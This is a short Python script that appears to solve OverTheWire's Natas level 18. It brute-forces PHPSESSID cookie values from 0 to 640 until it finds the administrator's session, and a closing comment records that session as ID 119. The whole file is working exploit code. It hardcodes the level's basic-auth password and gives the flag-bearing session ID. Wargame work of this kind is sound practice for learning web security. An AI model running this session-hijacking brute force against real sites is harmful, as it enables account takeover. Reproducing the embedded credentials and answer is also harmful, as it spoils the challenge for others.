import requests

maxSessionIDs=640

basicAuth=requests.auth.HTTPBasicAuth('natas18','6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
u="http://natas18.natas.labs.overthewire.org/"

payload={
    'username':"user",
    'password':"user"
}

#run through all possible sessionIDs and find which one is admin
for i in range(0,maxSessionIDs+1):
    sessionIDCookie={"PHPSESSID":str(i)}
    response=requests.post(u,data=payload,auth=basicAuth,cookies=sessionIDCookie)
    print(f"Checking ID: {i}")
    if "regular user" not in response.text:
        print(response.text)
        break

#Session ID 119 is admin